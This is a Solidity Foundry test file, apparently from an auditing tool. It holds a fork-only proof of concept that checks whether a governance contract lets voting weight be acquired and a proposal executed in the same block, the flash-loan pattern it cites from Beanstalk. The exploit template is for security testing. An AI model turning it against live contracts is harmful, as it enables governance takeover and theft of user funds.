// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Governance executes on live voting power
/// @notice Detector: governance-live-voting-power. The execution path reads
///         voting weight from a live balance, so weight acquired in the same
///         block counts. Capital that can be borrowed counts as a vote.
/// @dev FORK-ONLY. Reference incident: Beanstalk Farms (April 2022, ~$182M) —
///      emergencyCommit read bipVotePercent from the Silo's current balance,
///      so a ~$1B flash loan rented a two-thirds supermajority and executed a
///      malicious BIP in one transaction. Fortress Protocol and Elephant Money
///      fell to the same primitive within six weeks.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      The harness needs no flash lender: it acquires weight with vm.deal and
///      votes and executes inside one block, which is the property under test.
///      The verdict is the proposal EXECUTING on weight that did not exist
///      before this block.
contract PoC is Test {
    address public target;
    address public govToken;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        govToken = vm.envOr("POC_TOKEN", address(0));
        require(target != address(0), "POC_TARGET not set (the governance contract)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "governance has no code at this fork block");
    }

    /// Weight acquired now, executed now. If both land in one block, the
    /// governance design is rentable — the whole Beanstalk primitive.
    function test_weightAcquiredAndExecutedInOneBlock() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1_000_000 ether);
        uint256 startBlock = block.number;

        // 1. Acquire weight: deposit / stake / delegate, whichever the target
        //    exposes. The amount is the harness's, not a flash lender's — the
        //    point is same-block acquisition, not the source of capital.
        string[3] memory acquire = ["deposit(uint256)", "stake(uint256)", "lock(uint256)"];
        bool acquired = false;
        for (uint256 i = 0; i < acquire.length && !acquired; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call{value: 1_000 ether}(abi.encodeWithSignature(acquire[i], 1_000 ether));
            console.log("weight acquisition via", acquire[i], ok);
            acquired = ok;
        }

        // 2. Execute in the SAME block. No warp, no roll: if this works, the
        //    weight was live rather than checkpointed.
        string[3] memory run = ["execute(uint256)", "commit(uint256)", "emergencyCommit(uint256)"];
        bool executed = false;
        for (uint256 i = 0; i < run.length && !executed; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature(run[i], uint256(1)));
            console.log("proposal execution via", run[i], ok);
            executed = ok;
        }

        console.log("block at acquire and at execute:", startBlock, block.number);

        assertTrue(
            acquired && executed && block.number == startBlock,
            "no same-block acquisition-and-execution. Tried deposit(uint256), stake(uint256), lock(uint256) then execute(uint256), commit(uint256), emergencyCommit(uint256). This does NOT establish safety: the target may name these differently, may require a pre-existing proposal id, or may genuinely checkpoint weight — in which case the finding is wrong and should be withdrawn. Confirm from the source which function reads the live balance."
        );
    }
}
